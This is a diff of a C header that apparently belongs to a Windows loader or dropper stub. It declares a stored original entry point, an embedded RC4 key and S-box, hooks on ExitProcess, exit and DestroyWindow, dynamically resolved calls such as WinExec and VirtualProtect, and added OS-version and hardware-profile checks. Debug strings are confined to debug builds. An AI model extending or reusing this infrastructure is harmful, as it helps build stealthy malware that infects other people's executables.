@@ -35,18 +35,25 @@ extern BYTE oepStub[OEPSTUBSIZE];
 #define STRIDX_COMMAHFF8		9
 #define STRIDX_HFF5				10
 #define STRIDX_DIRSEP			11
-#define STRIDX_ERRORCREDIR		12
-#define STRIDX_EXITPROCIDX		13
-#define STRIDX_EXITPROCHOOKED   14
-#define STRIDX_RESTOREOEP		15
-#define STRIDX_EXITHOOKED		16
-#define STRIDX_OEPRESTORED		17
-#define STRIDX_CALLINGOEP		18
-#define STRIDX_CREATEFILE_ERR   19
-#define STRIDX_HFF5CALLING      20
-#define STRIDX_HFF5CALLED	    21
-#define STRIDX_INEXITPROC_HOOK  22
-#define STRIDX_VECTORQUIT		23
+#define STRIDX_USER32_DLL		12
+
+#if _DEBUG
+#define STRIDX_ERRORCREDIR		13
+#define STRIDX_EXITPROCIDX		14
+#define STRIDX_EXITPROCHOOKED   15
+#define STRIDX_RESTOREOEP		16
+#define STRIDX_EXITHOOKED		17
+#define STRIDX_OEPRESTORED		18
+#define STRIDX_CALLINGOEP		19
+#define STRIDX_CREATEFILE_ERR   20
+#define STRIDX_HFF5CALLING      21
+#define STRIDX_HFF5CALLED	    22
+#define STRIDX_INEXITPROC_HOOK  23
+#define STRIDX_VECTORQUIT		24
+#define STRIDX_VERIFYVERSION    25
+#define STRIDX_SYSMAJORVER		26
+#define STRIDX_SYSMINORVER		27
+#endif
 
 /*
 #define STRIDX_WRITING_DRVR		8
@@ -84,19 +91,19 @@ extern BYTE oepStub[OEPSTUBSIZE];
 // DLL calls indexes
 
 // KERNEL32.dll
-#define	CALL_OUTPUTDEBUGSTRINGA 0
-#define	CALL_CREATEFILEA		1
-#define CALL_CREATEDIRECTORYA	2
-#define CALL_CLOSEHANDLE		3
-#define	CALL_WRITEFILE			4
-#define CALL_READFILE			5
-#define CALL_SETFILEPOINTER		6
-#define CALL_GETMODULEFILENAMEW 7
-#define	CALL_VIRTUALALLOC		8
-#define CALL_VIRTUALFREE		9
-#define CALL_VIRTUALPROTECT		10
-#define CALL_WINEXEC			11
-#define CALL_FREELIBRARY		12
+#define	CALL_OUTPUTDEBUGSTRINGA			0
+#define	CALL_CREATEFILEA				1
+#define CALL_CREATEDIRECTORYA			2
+#define CALL_CLOSEHANDLE				3
+#define	CALL_WRITEFILE					4
+#define CALL_READFILE					5
+#define CALL_SETFILEPOINTER				6
+#define CALL_GETMODULEFILENAMEW			7
+#define	CALL_VIRTUALALLOC				8
+#define CALL_VIRTUALFREE				9
+#define CALL_VIRTUALPROTECT				10
+#define CALL_WINEXEC					11
+#define CALL_FREELIBRARY				12
 #define CALL_GETENVIRONMENTVARIABLEA	13
 #define CALL_SETCURRENTDIRECTORYA		14
 #define CALL_SETFILEATTRIBUTESA			15
@@ -112,10 +119,15 @@ extern BYTE oepStub[OEPSTUBSIZE];
 #define CALL_LOADLIBRARY				25
 #define CALL_GETPROCADDRESS				26
 #define CALL_VIRTUALQUERY				27
-#define CALL_EXIT						29
+#define CALL_VERIFYVERSIONINFO			28
+#define CALL_GETVERSIONEX				29
 
-// USER32.dll
-#define CALL_SPRINTF					28
+// MSVCRT.dll
+#define CALL_SPRINTF					30
+#define CALL_EXIT						31
+
+// ADVAPI32.DLL
+#define CALL_GETCURRENTHWPROFILE		32
 
 // #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
 #define STRING(idx) strings + stringsOffsets[(idx)]
@@ -172,7 +184,7 @@ typedef __declspec(align(4)) struct _data_section_header {
 	CHAR rc4key[RC4KEYLEN];
 	// SBox
 	unsigned char gSBox[SBOX_SIZE + 1];
-	
+
 	// OEP
 	WINSTARTFUNC   pfn_OriginalEntryPoint;
 	
@@ -193,9 +205,8 @@ typedef __declspec(align(4)) struct _data_section_header {
 		DataSectionBlob exitProcessHook;
 		DataSectionBlob exitHook;
 		DataSectionBlob rvaToOffset;
-		//DataSectionBlob RC4InitSBox;
-		//DataSectionBlob RC4Crypt;
 		DataSectionBlob rc4;
+		DataSectionBlob destroyWindowHook;
 	} functions;
 	
 	// strings
@@ -358,6 +369,18 @@ typedef SIZE_T (WINAPI *VIRTUALQUERY)(
 								   );
 
 typedef void (__cdecl *EXIT)(_In_ int status);
+
+typedef BOOL (*VERIFYVERSIONINFO) (
+							  OSVERSIONINFOEX* lpVersionInfo,
+							  DWORD dwTypeMask,
+							  DWORDLONG dwlConditionMask
+							  );
+
+typedef BOOL (*GETVERSIONEX)( OSVERSIONINFO* lpVersionInfo );
+
+typedef BOOL (*GETCURRENTHWPROFILE)(
+										__out  LPHW_PROFILE_INFO lpHwProfileInfo
+										);
 
 typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);
 
